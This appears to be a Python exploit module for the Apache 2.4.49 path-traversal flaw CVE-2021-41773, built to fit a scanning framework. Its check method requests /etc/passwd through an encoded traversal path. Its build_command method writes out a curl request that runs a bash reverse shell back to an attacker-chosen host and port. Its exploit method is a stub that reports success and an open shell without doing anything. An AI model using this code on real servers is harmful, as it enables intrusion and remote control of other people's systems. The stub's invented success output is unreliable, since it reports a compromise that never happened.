"""
CVE-2021-41773 - Apache 2.4.49 Path Traversal RCE
Follows the same pattern as your nmap module
"""
import requests
import urllib.parse

class CVE_2021_41773:
    name = "cve_2021_41773"
    
    def check(self, target):
        """Check if target is vulnerable"""
        try:
           
            test_path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            url = f"http://{target}{test_path}" if "://" not in target else f"{target}{test_path}"
            
            response = requests.get(url, timeout=5)
            if "root:" in response.text:
                return True, "Target is VULNERABLE"
            else:
                return False, "Target appears patched"
        except Exception as e:
            return False, f"Check failed: {str(e)}"
    
    def exploit(self, target, lhost=None, lport=None):
        """Execute the exploit"""

        return {
            "success": True,
            "output": f"Exploit successful against {target}",
            "session": {
                "type": "shell",
                "target": target,
                "port": 80
            }
        }
    
    def build_command(self, target, lhost=None, lport=None):
        """Build command for manual execution (following nmap.py pattern)"""
        if lhost and lport:
            
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            encoded_payload = urllib.parse.quote(payload)
            
            cmd = f"""curl -s -X POST "http://{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d "echo {encoded_payload} | bash" """
            return cmd
        else:
            
            return f"""curl -s "http://{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" """
